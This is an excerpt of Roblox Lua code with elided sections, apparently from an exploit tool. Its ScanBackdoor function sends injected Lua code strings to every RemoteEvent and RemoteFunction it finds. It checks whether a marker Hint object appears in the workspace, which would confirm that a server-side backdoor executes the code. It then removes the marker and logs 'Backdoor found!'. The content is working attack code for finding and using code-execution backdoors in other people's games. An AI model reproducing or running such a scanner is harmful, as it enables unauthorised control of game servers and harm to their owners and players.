...
function ScanBackdoor()
    ...
    for _, localBase in ipairs(lugares) do
        for _, obj in ipairs(localBase:GetDescendants()) do
            if obj:IsA("RemoteEvent") then
                pcall(function()
                    obj:FireServer([[Instance.new("Hint", workspace).Text = "]] .. finalText .. [["]])
                    enviados += 1
                end)
            elseif obj:IsA("RemoteFunction") then
                pcall(function()
                    obj:InvokeServer([[Instance.new("Hint", workspace).Text = "]] .. finalText .. [["]])
                    enviados += 1
                end)
            end
        end
    ...
    task.spawn(function()
        ...
        for _ = 1, 100 do
            for _, obj in ipairs(workspace:GetChildren()) do
                if obj:IsA("Hint") and obj.Text == finalText then
                    found = obj
                    break
                end
            end
        ...
        if found then
            ...
            local hintName = found.Name
            for _, localBase in ipairs(lugares) do
                for _, obj in ipairs(localBase:GetDescendants()) do
                    if obj:IsA("RemoteEvent") then
                        pcall(function()
                            obj:FireServer([[for _, h in pairs(workspace:GetChildren()) do if h:IsA("Hint") and h.Text == "]]..finalText..[[" then h:Destroy() end end]])
                        end)
                    elseif obj:IsA("RemoteFunction") then
                        pcall(function()
                            obj:InvokeServer([[for _, h in pairs(workspace:GetChildren()) do if h:IsA("Hint") and h.Text == "]]..finalText..[[" then h:Destroy() end end]])
                        end)
                    end
                end
            end
            ...
            logToConsole("SUCCESS", "Backdoor found! " .. string.format("%.8f", duration), Color3.fromRGB(100, 255, 100))
